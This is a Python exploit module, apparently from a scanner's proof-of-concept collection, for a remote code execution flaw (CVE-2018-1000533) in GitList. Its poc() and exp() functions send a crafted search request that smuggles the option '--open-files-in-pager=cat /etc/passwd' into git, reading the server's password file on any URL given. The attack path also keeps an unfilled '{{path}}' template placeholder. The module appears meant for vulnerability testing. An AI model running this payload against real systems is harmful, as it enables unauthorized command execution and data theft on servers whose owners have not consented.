import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''GitList < 0.6.0 RCE''',
        "description": '''klaussilveira GitList version <= 0.6 contains a Passing incorrectly sanitized input to system function vulnerability in `searchTree` function that can result in Execute any code as PHP user.''',
        "severity": "critical",
        "references": [
            "https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2018-1000533",
            "cwe-id": "CWE-20"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rce", "git", "cve", "cve2018", "gitlist"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/"""
        method = "GET"
        data = """"""
        headers = {}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/{{path}}/tree/a/search"""
        method = "POST"
        data = """query=--open-files-in-pager=cat%20/etc/passwd"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""root:/root:/bin/bash""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url